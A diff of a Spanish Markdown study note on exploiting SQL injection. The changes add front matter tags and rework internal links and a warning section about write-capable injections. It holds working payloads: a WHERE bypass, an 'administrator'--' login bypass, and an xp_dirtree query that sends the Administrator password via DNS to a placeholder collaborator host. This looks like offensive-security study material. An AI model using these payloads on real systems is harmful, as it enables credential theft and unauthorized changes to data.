@@ -1,3 +1,15 @@
+---
+aliases:
+  - SQLi
+  - SQL Injection
+  - sql-injection
+  - sqli-entrypoint
+tags:
+  - vuln/sql-injection
+  - tipo/injection
+  - entrypoint
+---
+
 # SQL Injection — Punto de entrada
 
 > Documento **agnóstico al negocio**: responde *cómo **explotar** una SQLi ya localizada*.
@@ -11,10 +23,10 @@
 
 ## 🗂️ Tipos de SQLi (mapa)
 
-- **Recuperación directa (in-band):** el dato **vuelve en la respuesta**. Ej.: mostrar registros ocultos vía `WHERE` (`' OR 1=1--`) o **login bypass** (`administrator'--`). → metodología abajo.
-- **UNION-based:** agregás tu propio `SELECT` para volcar **otras tablas** en la respuesta visible. → sección **UNION attacks**.
-- **Blind:** **no ves** el dato; lo inferís por **booleano / error / tiempo / OAST**. → sección **Blind SQLi**.
-- **Escritura (menos común):** `UPDATE` / `INSERT` / stacked queries → **modificar** la base, no solo leerla. → callout al final.
+- **Recuperación directa (in-band):** el dato **vuelve en la respuesta**. Ej.: mostrar registros ocultos vía `WHERE` (`' OR 1=1--`) o **login bypass** (`administrator'--`). → [[#🧪 Cómo explotar (metodología)|metodología]].
+- **UNION-based:** agregás tu propio `SELECT` para volcar **otras tablas** en la respuesta visible. → [[#🔗 UNION attacks — vectores directos|UNION attacks]].
+- **Blind:** **no ves** el dato; lo inferís por **booleano / error / tiempo / OAST**. → [[#🕵️ Blind SQLi — vectores directos|Blind SQLi]].
+- **Escritura (menos común):** `UPDATE` / `INSERT` / stacked queries → **modificar** la base, no solo leerla. → [[#⚠️ Vector de escritura (no es solo lectura)|vector de escritura]].
 
 ## 🧪 Cómo explotar (metodología)
 
@@ -103,9 +115,11 @@ Disparar (confirmar la interacción DNS):
 Exfiltrar (el dato viaja en el **subdominio** de la petición DNS):
 <pre><code>'; declare @p varchar(1024);set @p=(SELECT <mark>password FROM users WHERE username='Administrator'</mark>);exec('master..xp_dirtree "//'+@p+'.<mark>BURP-COLLABORATOR-SUBDOMAIN</mark>/a"')--</code></pre>
 
-(Oracle: `EXTRACTVALUE(xmltype(...))`; PostgreSQL: función + `nslookup`; ver [cheat-sheet.md](cheat-sheet.md).) Automatizá el 0–3 con los [scripts](#-scripts-de-ayuda) de abajo.
+(Oracle: `EXTRACTVALUE(xmltype(...))`; PostgreSQL: función + `nslookup`; ver [cheat-sheet.md](cheat-sheet.md).) Automatizá el 0–3 con los [[#🐍 Scripts de ayuda|scripts]] de abajo.
 
-> [!warning] No es solo lectura: también es vector de escritura
+## ⚠️ Vector de escritura (no es solo lectura)
+
+> [!warning] No se limita a leer
 > Una SQLi **no se limita a leer** con `SELECT`. Es poco probable, pero puede permitir **`UPDATE` / `INSERT` / `DELETE`** — o sea, **modificar** la base, no solo extraerla. Casos típicos:
 > - La consulta vulnerable **ya es un `UPDATE`/`INSERT`** (ej. editar perfil, registro, carrito) → tu inyección altera esa escritura.
 > - El motor/driver permite **stacked queries** (`; INSERT ...`, `; UPDATE ...`) → encadenás tu propia sentencia (ver *Batched queries* en la [cheat-sheet.md](cheat-sheet.md); ojo: Oracle no las soporta).
